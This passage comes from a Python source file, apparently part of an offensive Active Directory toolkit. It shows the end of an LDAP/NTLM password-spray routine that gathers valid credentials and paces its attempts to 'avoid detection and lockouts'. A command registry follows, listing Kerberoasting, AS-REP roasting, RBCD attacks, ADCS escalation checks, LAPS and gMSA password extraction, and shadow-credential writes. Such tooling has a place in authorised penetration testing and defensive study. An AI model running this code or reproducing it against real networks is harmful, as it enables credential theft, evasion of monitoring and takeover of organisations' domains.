                                       password=spray_password,
                                       authentication=NTLM,
                                       auto_bind=True,
                                       receive_timeout=10)
                valid_creds.append({
                    "username": target_user,
                    "password": spray_password,
                })
                test_conn.unbind()
            except LDAPException:
                pass
            except Exception as e:
                errors.append(f"{target_user}: {str(e)[:80]}")

            # Delay between attempts to avoid detection and lockouts
            if tested % 10 == 0:
                time.sleep(1)

        return {
            "action": "spray",
            "tested_users": tested,
            "valid_credentials": valid_creds,
            "valid_count": len(valid_creds),
            "lockout_threshold": lockout_threshold,
            "errors": errors[:10],
            "spray_password": spray_password,
        }

    conn.unbind()
    return {"status": "error", "error": f"Unknown action '{action}'. Use: policy, spray"}


# ---------------------------------------------------------------------------
# Module command registry
# ---------------------------------------------------------------------------

COMMANDS = {
    "ad_enum": {
        "handler": cmd_ad_enum,
        "description": "Full AD domain enumeration: users, computers, groups, GPOs, trusts, delegation",
    },
    "ad_kerberoast": {
        "handler": cmd_ad_kerberoast,
        "description": "Find Kerberoastable accounts (users with SPNs)",
    },
    "ad_asreproast": {
        "handler": cmd_ad_asreproast,
        "description": "Find AS-REP Roastable accounts (DONT_REQUIRE_PREAUTH)",
    },
    "ad_acl_scan": {
        "handler": cmd_ad_acl_scan,
        "description": "Scan ACLs for dangerous permissions (GenericAll, WriteDACL, WriteOwner, etc.)",
    },
    "ad_rbcd": {
        "handler": cmd_ad_rbcd,
        "description": "Resource-Based Constrained Delegation: scan, attack, or cleanup",
    },
    "ad_delegation": {
        "handler": cmd_ad_delegation,
        "description": "Enumerate all delegation types: unconstrained, constrained, RBCD",
    },
    "ad_adcs": {
        "handler": cmd_ad_adcs,
        "description": "ADCS vulnerability scanner: ESC1-ESC8 checks on CAs and templates",
    },
    "ad_laps": {
        "handler": cmd_ad_laps,
        "description": "Read LAPS passwords (v1 ms-Mcs-AdmPwd, v2 msLAPS-Password)",
    },
    "ad_shadow_creds": {
        "handler": cmd_ad_shadow_creds,
        "description": "Shadow Credentials: read/write/clear msDS-KeyCredentialLink",
    },
    "ad_gmsa": {
        "handler": cmd_ad_gmsa,
        "description": "Extract Group Managed Service Account (gMSA) passwords",
    },
    "ad_trusts": {
        "handler": cmd_ad_trusts,
        "description": "Enumerate domain/forest trusts with attack path analysis",
    },
    "ad_passwords": {
        "handler": cmd_ad_passwords,
        "description": "Password policy retrieval and lockout-aware password spray",
    },
}
